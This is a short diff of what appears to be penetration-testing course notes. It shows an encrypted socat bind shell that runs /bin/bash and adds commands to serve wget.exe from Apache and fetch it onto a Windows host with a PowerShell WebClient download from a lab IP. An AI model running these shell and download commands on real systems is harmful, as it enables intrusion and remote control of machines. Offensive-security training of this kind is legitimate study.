@@ -61,3 +61,20 @@ pem and key into one file
 cat bind_shell.key bindshell.crt > bindshell.pem
 
 sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+
+powershell and powercat
+
+Launch as Administrator Set-ExecutionPolicy Unrestricted
+
+powershell file transfers
+
+Copy Wget
+
+sudo cp /usr/share/windows-resources/binaries/wget.exe /var/www/html/
+sudo systemctl start apache2
+
+Powershell Remote File Download from Web
+
+powershell -c "(new-object system.net.webclient).downloadfile('http://10.11.0.4/wget.exe','C:\users\offsec\Desktop\wget.exe')"
+
+
